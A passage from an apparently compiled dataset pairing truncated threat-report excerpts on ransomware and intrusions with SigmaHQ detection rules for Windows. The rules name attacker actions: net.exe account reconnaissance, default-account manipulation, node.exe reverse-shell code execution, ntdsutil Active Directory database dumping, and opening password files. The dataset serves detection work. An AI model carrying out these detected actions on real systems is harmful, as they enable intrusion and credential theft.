    "markdown": "# Back in Black: Unlocking a LockBit 3.0 Ransomware Attack **19 August 2022** **By RIFT: Research and Intelligence Fusion Team** --- ## Summary ### tl;dr This post explores some of the TTPs employed by a threat actor who were observed deploying LockBit 3.0 ransomware during an incident response engagement. Below provides a summary of findings which are presented in this blog post: - Initial access via SocGholish. - Establishing persistence to run Cobalt Strike beacon. - Disabling of Windows Defender and Sophos. - Use of information gathering tools such as Bloodhound and Seatbelt. - Lateral movement leveraging RDP and Cobalt",
    "sigma_rule": {
      "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
      "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
      "status": "test",
      "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n",
      "references": [
        "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
        "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2023-03-02",
      "tags": [
        "attack.discovery",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_group_root": {
          "CommandLine|contains": [
            " group ",
            " localgroup "
          ]
        },
        "selection_group_flags": {
          "CommandLine|contains": [
            "domain admins",
            " administrator",
            " administrateur",
            "enterprise admins",
            "Exchange Trusted Subsystem",
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto",
            " /do"
          ]
        },
        "filter_group_add": {
          "CommandLine|contains": " /add"
        },
        "selection_accounts_root": {
          "CommandLine|contains": " accounts "
        },
        "selection_accounts_flags": {
          "CommandLine|contains": " /do"
        },
        "condition": "selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
      },
      "falsepositives": [
        "Inventory tool runs",
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_groups_and_accounts_recon.yml"
  },
  "286": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "New User Created Via Net.EXE With Never Expire Option",
      "id": "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
      "related": [
        {
          "id": "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of local users via the net.exe command with the option \"never expire\"",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-02-21",
      "tags": [
        "attack.persistence",
        "attack.t1136.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "user",
            "add",
            "expires:never"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_add_never_expire.yml"
  },
  "287": {
    "url": "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
    "markdown": "# LockerGoga Ransomware Family Used in Targeted Attacks _April 29, 2019_ ## Initial discovery Once again, we have seen a significant new ransomware family in the news. LockerGoga, which adds new features to the tried and true formula of encrypting victims’ files and asking for payment to decrypt them, has gained notoriety for the targets it has affected. In this blog, we will look at the findings of the McAfee ATR team following analysis of several different samples. We will describe how this new ransomware works and detail how enterprises can protect themselves from this threat. ## Technical analysis LockerGoga",
    "sigma_rule": {
      "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
      "id": "5b768e71-86f2-4879-b448-81061cbae951",
      "status": "test",
      "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc",
      "references": [
        "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
        "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2023-02-21",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_user_option": {
          "CommandLine|contains": " user "
        },
        "selection_username": {
          "CommandLine|contains": [
            " Järjestelmänvalvoja ",
            " Rendszergazda ",
            " Администратор ",
            " Administrateur ",
            " Administrador ",
            " Administratör ",
            " Administrator ",
            " guest ",
            " DefaultAccount ",
            " \"Järjestelmänvalvoja\" ",
            " \"Rendszergazda\" ",
            " \"Администратор\" ",
            " \"Administrateur\" ",
            " \"Administrador\" ",
            " \"Administratör\" ",
            " \"Administrator\" ",
            " \"guest\" ",
            " \"DefaultAccount\" ",
            " 'Järjestelmänvalvoja' ",
            " 'Rendszergazda' ",
            " 'Администратор' ",
            " 'Administrateur' ",
            " 'Administrador' ",
            " 'Administratör' ",
            " 'Administrator' ",
            " 'guest' ",
            " 'DefaultAccount' "
          ]
        },
        "filter": {
          "CommandLine|contains|all": [
            "guest",
            "/active no"
          ]
        },
        "condition": "all of selection_* and not filter"
      },
      "falsepositives": [
        "Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_default_accounts_manipulation.yml"
  },
  "288": {
    "url": "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
    "markdown": "# BianLian Ransomware Gang **Gives It a Go!** **Date:** September 1, 2022 Earlier this year, [redacted] encountered a relatively new ransomware threat actor that called themselves BianLian. We observed the actor deploying custom malware that was written in the Go programming language, which posed some initial, but not insurmountable, reverse-engineering challenges. BianLian used subtle techniques to exploit, enumerate, and move laterally in victim networks to remain undetected and aggressively worked to counter Endpoint Detection & Response (EDR) protections during the encryption phase of their operations. The group has displayed signs of being new to the practical business aspects of ransomware",
    "sigma_rule": {
      "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
      "id": "5b768e71-86f2-4879-b448-81061cbae951",
      "status": "test",
      "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc",
      "references": [
        "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
        "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2023-02-21",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_user_option": {
          "CommandLine|contains": " user "
        },
        "selection_username": {
          "CommandLine|contains": [
            " Järjestelmänvalvoja ",
            " Rendszergazda ",
            " Администратор ",
            " Administrateur ",
            " Administrador ",
            " Administratör ",
            " Administrator ",
            " guest ",
            " DefaultAccount ",
            " \"Järjestelmänvalvoja\" ",
            " \"Rendszergazda\" ",
            " \"Администратор\" ",
            " \"Administrateur\" ",
            " \"Administrador\" ",
            " \"Administratör\" ",
            " \"Administrator\" ",
            " \"guest\" ",
            " \"DefaultAccount\" ",
            " 'Järjestelmänvalvoja' ",
            " 'Rendszergazda' ",
            " 'Администратор' ",
            " 'Administrateur' ",
            " 'Administrador' ",
            " 'Administratör' ",
            " 'Administrator' ",
            " 'guest' ",
            " 'DefaultAccount' "
          ]
        },
        "filter": {
          "CommandLine|contains|all": [
            "guest",
            "/active no"
          ]
        },
        "condition": "all of selection_* and not filter"
      },
      "falsepositives": [
        "Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_default_accounts_manipulation.yml"
  },
  "289": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
    "markdown": "# Profiling DEV-0270: PHOSPHORUS’ ransomware operations **Research** | **Threat intelligence** | **Threat actors** **September 7, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **PHOSPHORUS** is now tracked as **Mint Sandstorm** > - **DEV-0270** is now tracked as **Storm-0270** > > To learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.",
    "sigma_rule": {
      "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
      "id": "5b768e71-86f2-4879-b448-81061cbae951",
      "status": "test",
      "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc",
      "references": [
        "https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html",
        "https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/",
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2023-02-21",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_user_option": {
          "CommandLine|contains": " user "
        },
        "selection_username": {
          "CommandLine|contains": [
            " Järjestelmänvalvoja ",
            " Rendszergazda ",
            " Администратор ",
            " Administrateur ",
            " Administrador ",
            " Administratör ",
            " Administrator ",
            " guest ",
            " DefaultAccount ",
            " \"Järjestelmänvalvoja\" ",
            " \"Rendszergazda\" ",
            " \"Администратор\" ",
            " \"Administrateur\" ",
            " \"Administrador\" ",
            " \"Administratör\" ",
            " \"Administrator\" ",
            " \"guest\" ",
            " \"DefaultAccount\" ",
            " 'Järjestelmänvalvoja' ",
            " 'Rendszergazda' ",
            " 'Администратор' ",
            " 'Administrateur' ",
            " 'Administrador' ",
            " 'Administratör' ",
            " 'Administrator' ",
            " 'guest' ",
            " 'DefaultAccount' "
          ]
        },
        "filter": {
          "CommandLine|contains|all": [
            "guest",
            "/active no"
          ]
        },
        "condition": "all of selection_* and not filter"
      },
      "falsepositives": [
        "Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_default_accounts_manipulation.yml"
  },
  "290": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "Potential Arbitrary Code Execution Via Node.EXE",
      "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
      "status": "test",
      "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
        "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
        "https://nodejs.org/api/cli.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "Image|endswith": "\\node.exe",
          "CommandLine|contains": [
            " -e ",
            " --eval "
          ]
        },
        "selection_action_reverse_shell": {
          "CommandLine|contains|all": [
            ".exec(",
            "net.socket",
            ".connect",
            "child_process"
          ]
        },
        "condition": "selection_main and 1 of selection_action_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_node_abuse.yml"
  },
  "291": {
    "url": "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
    "markdown": "# Crossing the Log4j Horizon - A Vulnerability With No Return Jan 10, 2022 **Categories**: Technical • External Testing • Exploitation **Tags**: Exploit • log4j • Pentesting • Tools ## Introduction - Log4jHorizon A vulnerability was recently disclosed for the Java logging library, Log4j. The vulnerability is wide-reaching and affects both open-source projects and enterprise software. VMWare announced shortly after the release of the issue that several of their products were affected. A proof of concept has been released for VMWare Horizon instances and allows attackers to execute code as an unauthenticated user using a single HTTP request. Using this",
    "sigma_rule": {
      "title": "Potential Arbitrary Code Execution Via Node.EXE",
      "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
      "status": "test",
      "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
        "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
        "https://nodejs.org/api/cli.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "Image|endswith": "\\node.exe",
          "CommandLine|contains": [
            " -e ",
            " --eval "
          ]
        },
        "selection_action_reverse_shell": {
          "CommandLine|contains|all": [
            ".exec(",
            "net.socket",
            ".connect",
            "child_process"
          ]
        },
        "condition": "selection_main and 1 of selection_action_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_node_abuse.yml"
  },
  "292": {
    "url": "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
    "markdown": "# Active Exploitation of VMware Horizon Servers **Date**: Jan 18, 2022 _Last updated at Mon, 07 Feb 2022 15:41:09 GMT_ *This post is co-authored by Charlie Stafford, Lead Security Researcher.* *We will update this blog with further information as it becomes available.* | CVE | Vendor Advisory | AttackerKB | IVM Content | Patching Urgency | Blog's Last Update | | -------------- | --------------- | ---------- | ---------------- | ---------------- | ---------------------------- | | CVE-2021-44228 | VMware Advisory | AttackerKB | February 4, 2022 | Emergency | February 7, 2022 10:40 AM ET | ## Summary Attackers are actively targeting",
    "sigma_rule": {
      "title": "Potential Arbitrary Code Execution Via Node.EXE",
      "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
      "status": "test",
      "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
        "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
        "https://nodejs.org/api/cli.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "Image|endswith": "\\node.exe",
          "CommandLine|contains": [
            " -e ",
            " --eval "
          ]
        },
        "selection_action_reverse_shell": {
          "CommandLine|contains|all": [
            ".exec(",
            "net.socket",
            ".connect",
            "child_process"
          ]
        },
        "condition": "selection_main and 1 of selection_action_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_node_abuse.yml"
  },
  "293": {
    "url": "https://nodejs.org/api/cli.html",
    "markdown": "# Node.js v23.1.0 documentation Node.js comes with a variety of CLI options. These options expose built-in debugging, multiple ways to execute scripts, and other helpful runtime options. To view this documentation as a manual page in a terminal, run `man node`. ## Table of Contents - Command-line API - Synopsis - Program entry point - ECMAScript modules loader entry point caveat - Options - Environment variables - Useful V8 options --- ## Command-line API Node.js comes with a variety of CLI options. These options expose built-in debugging, multiple ways to execute scripts, and other helpful runtime options. To view this",
    "sigma_rule": {
      "title": "Potential Arbitrary Code Execution Via Node.EXE",
      "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
      "status": "test",
      "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
        "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
        "https://nodejs.org/api/cli.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "Image|endswith": "\\node.exe",
          "CommandLine|contains": [
            " -e ",
            " --eval "
          ]
        },
        "selection_action_reverse_shell": {
          "CommandLine|contains|all": [
            ".exec(",
            "net.socket",
            ".connect",
            "child_process"
          ]
        },
        "condition": "selection_main and 1 of selection_action_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_node_abuse.yml"
  },
  "294": {
    "url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
    "markdown": "# Confluence Exploit Leads to LockBit Ransomware **Categories:** exploit, lockbit, ransomware **Published on:** February 24, 2025 ## Key Takeaways - The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment. - The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk. - The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy. - Sensitive data was exfiltrated using Rclone, transferring files to MEGA.io cloud storage.",
    "sigma_rule": {
      "title": "Notepad Password Files Discovery",
      "id": "3b4e950b-a3ea-44d3-877e-432071990709",
      "status": "experimental",
      "description": "Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.",
      "references": [
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
        "https://intel.thedfirreport.com/eventReports/view/57"
      ],
      "author": "The DFIR Report",
      "tags": [
        "attack.discovery",
        "attack.t1083"
      ],
      "date": "2025-02-21",
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\explorer.exe",
          "Image|endswith": "\\notepad.exe",
          "CommandLine|endswith": [
            "password*.txt",
            "password*.csv",
            "password*.doc",
            "password*.xls"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_notepad_local_passwd_discovery.yml"
  },
  "295": {
    "url": "https://intel.thedfirreport.com/eventReports/view/57",
    "markdown": "",
    "sigma_rule": {
      "title": "Notepad Password Files Discovery",
      "id": "3b4e950b-a3ea-44d3-877e-432071990709",
      "status": "experimental",
      "description": "Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.",
      "references": [
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
        "https://intel.thedfirreport.com/eventReports/view/57"
      ],
      "author": "The DFIR Report",
      "tags": [
        "attack.discovery",
        "attack.t1083"
      ],
      "date": "2025-02-21",
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\explorer.exe",
          "Image|endswith": "\\notepad.exe",
          "CommandLine|endswith": [
            "password*.txt",
            "password*.csv",
            "password*.doc",
            "password*.xls"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_notepad_local_passwd_discovery.yml"
  },
  "296": {
    "url": "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
    "markdown": "# Qbot Likes to Move It, Move It **Category:** Qbot **Published on:** February 7, 2022 ## Introduction Qbot (aka QakBot, Quakbot, Pinkslipbot) has been around for a long time, having first been observed back in 2007. More info on Qbot can be found at the following links: Microsoft & Red Canary. In this case, from October 2021, we will break down how Qbot quickly spread across all workstations in an environment, while stealing browser information and emails. While the case is nearly 5 months old, Qbot infections in the past week have followed the same pattern. ## Case Summary We",
    "sigma_rule": {
      "title": "Network Reconnaissance Activity",
      "id": "e6313acd-208c-44fc-a0ff-db85d572e90e",
      "status": "test",
      "description": "Detects a set of suspicious network related commands often used in recon stages",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-07",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1082",
        "car.2016-03-001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "nslookup",
            "_ldap._tcp.dc._msdcs."
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "False positives depend on scripts and administrative tools used in the monitored environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_nslookup_domain_discovery.yml"
  },
  "297": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)",
    "markdown": "# snapshot **Applies To**: Windows Server 2008, Windows Server 2012, Windows 8 Manages snapshots of the volumes that contain the Active Directory database and log files, which you can view on a domain controller without starting in Directory Services Restore Mode (DSRM). You can also run the snapshot subcommand on an Active Directory Lightweight Directory Services (AD LDS) server. In the command-line tool Ntdsutil.exe, you can use the snapshot subcommand to manage the snapshots, but you must use Dsamain.exe to expose the snapshot as a Lightweight Directory Access Protocol (LDAP) server. For more information about using Dsamain, see Dsamain). This",
    "sigma_rule": {
      "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)",
      "id": "a58353df-af43-4753-bad0-cd83ef35eef5",
      "related": [
        {
          "id": "2afafd61-6aae-4df4-baed-139fa1f4c345",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.",
      "references": [
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\ntdsutil.exe"
          },
          {
            "OriginalFileName": "ntdsutil.exe"
          }
        ],
        "selection_cli": [
          {
            "CommandLine|contains|all": [
              "snapshot",
              "mount "
            ]
          },
          {
            "CommandLine|contains|all": [
              "ac",
              " i",
              " ntds"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage to restore snapshots",
        "Legitimate admin activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ntdsutil_susp_usage.yml"
  },
  "298": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
    "markdown": "# New Wave of Espionage Activity Targets Asian Governments **Governments and state-owned organizations are the latest targets of a well-established threat actor.** Posted: 13 Sep, 2022 --- A distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal. ## Targets The current campaign appears to be almost exclusively focused",
    "sigma_rule": {
      "title": "Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)",
      "id": "a58353df-af43-4753-bad0-cd83ef35eef5",
      "related": [
        {
          "id": "2afafd61-6aae-4df4-baed-139fa1f4c345",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.",
      "references": [
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\ntdsutil.exe"
          },
          {
            "OriginalFileName": "ntdsutil.exe"
          }
        ],
        "selection_cli": [
          {
            "CommandLine|contains|all": [
              "snapshot",
              "mount "
            ]
          },
          {
            "CommandLine|contains|all": [
              "ac",
              " i",
              " ntds"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage to restore snapshots",
        "Legitimate admin activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ntdsutil_susp_usage.yml"
  },
  "299": {
    "url": "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
    "markdown": "# ODBCCONF.EXE ODBCCONF.exe is a command-line tool that allows you to configure ODBC drivers and data source names. > **Note** > ODBCCONF.exe will be removed in a future version of Windows Data Access Components. Avoid using this feature, and plan to modify applications that currently use this feature. You can use PowerShell commands to manage drivers and data sources. For more information about these PowerShell commands, see Windows Data Access Components cmdlets. ## Syntax ``` ODBCCONF [switches] action ``` ## Arguments * *switches* Zero or more switch options. For the list of available switches, see the Remarks section, later in",
    "sigma_rule": {
      "title": "Odbcconf.EXE Suspicious DLL Location",
